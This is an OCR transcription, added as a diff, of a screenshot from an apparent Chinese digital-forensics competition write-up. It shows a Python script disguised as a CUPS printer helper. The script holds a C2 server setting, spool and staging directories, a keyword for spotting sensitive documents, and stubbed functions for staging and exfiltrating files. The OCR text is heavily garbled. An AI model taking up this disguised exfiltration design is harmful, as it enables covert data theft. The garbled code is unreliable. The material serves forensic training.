@@ -1,0 +1,81 @@
+# OCR: d5173d825f926c340b551916f002815f.webp
+# 来源: ./02-WriteUp/2025/2025-数证杯-初赛/d5173d825f926c340b551916f002815f.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:32
+
+CY Oriworkspacelprintunevate-Printer-IMusrVocahbinhcups-helper-Notepad+ [Administrater]
+编罐(E)我家(S)
+M
+文
+编网(N)
+透富()
+插件(P)
+图(V)
+置(T)
+工具(O)
+运行(R)
+口(w)?
+国电国国e
+CB800ei0ea
+cae
+401.F
+cups-helper
+1/usr/bin/python3
+12 3567 9 10 13399 15 5599 19 12223335382 23135333012845
+-s-coding: utf-8
+A heiper seript tomanage cups spooling and performhealth
+checks
+Do not modify unless you aze an authorized technician.
+KVJEYIHHXSLOPIEBEAWT4ICCMFZWRNRUEDT3ZVXHUCASALJ6EDS23F7HVSTOJOFS4WHY32F5VQW383m importos
+shutil
+import import
+socket datetime
+import import
+re
+Configuration
+c2 sorver for uploading diagnostic
+data
+C2_SERVER -"zUTMugDMx4SO5EjL1gTM*
+"zODN"
+C2_PORT-
++spool directory to monitor
+SPOOL_DIR ="GJTJzBXdj3kMIw2bvB3cG>TJyFmdGJTJ"
+ Define staging directory for processing STAGING_DIR-
+"GJT71h2YhNmLGJTJw1GdGTJ"
+before
+exfiltration
+for upload activities
+Log
+file
+LOG_FILE
+"awZVXmLkF2bsBXdGJrJ1JXYoNnRyUCbhN2bs5iRyUCdv9mcGJTJ*
+Keyword to identify sensitive documents for "special handling" WATCHED_REYWORD "sUmcpZmbVdWYyREMyUCdjVaVJHUn
+End configuration ---
+Bdef Edef
+log_message(message) :
+"Appends timestamped message to the log file."ww
+nowdatetime.datetime.now().strftime("sY-m-td H:w:%s")
+(message) In"
+full_message="[(now]]
+with open(LOG_FILE,'a') as f:
+f.write(full_message) scan_and_stage(0 :
+Scans the spool directory and copies sensitive files to the staging area,"us
+wn"(simulated) pass
+exfiitrate_data(): Edef
+"Uploads
+sa"(simulated)
+filesfrom
+if not os.path.exists(STAGING_DIR):
+return
+Python file
+staging directory to the c2 server.wn the:
+长牌：2.187
+行款：73
+1
+o
+公众号·小谢取证
+列1
+微置：1
+Windows (CR LF) UTF-8
+x INS
